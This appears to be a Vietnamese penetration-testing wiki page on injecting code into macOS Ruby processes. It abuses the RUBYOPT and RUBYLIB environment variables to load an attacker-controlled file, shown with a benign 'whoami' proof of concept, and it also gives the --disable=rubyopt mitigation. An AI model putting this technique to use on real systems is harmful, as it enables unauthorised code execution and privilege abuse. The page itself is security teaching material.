# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby phân tích các tùy chọn dòng lệnh được hỗ trợ từ biến môi trường `RUBYOPT` trước khi chạy script. Ruby từ chối thực thi code thông qua `-e` trong `RUBYOPT`, nhưng `-I` có thể thêm thư mục tìm kiếm thư viện vào đầu danh sách và `-r` có thể require một thư viện. Vì vậy, một tiến trình khởi chạy Ruby với các biến môi trường do attacker kiểm soát có thể bị buộc nạp code Ruby do attacker kiểm soát.<sup>[[1]](#references)</sup>

Tạo `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Tạo một script Ruby vô hại, chẳng hạn như `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Chạy nó với giá trị `RUBYOPT` được kiểm soát:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Để vô hiệu hóa hành vi này, hãy truyền `--disable=rubyopt` (hoặc `--disable-rubyopt`) **trước** tên script:<sup>[[1]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Một tùy chọn được ghi sau `hello.rb` sẽ được truyền cho script trong `ARGV`; tùy chọn đó không vô hiệu hóa việc Ruby xử lý `RUBYOPT` trước đó.<sup>[[1]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

## RUBYLIB

Thay vì thêm thư mục tải vào đầu danh sách bằng `-I` bên trong `RUBYOPT`, biến môi trường riêng `RUBYLIB` thêm các thư mục vào `$LOAD_PATH` của Ruby. Kết hợp với `RUBYOPT=-r<module>`, cách này tải mã của attacker mà không cần `-I` trong `RUBYOPT`:<sup>[[1]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## References

- [1] [Tài liệu Ruby - Các tùy chọn dòng lệnh của Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
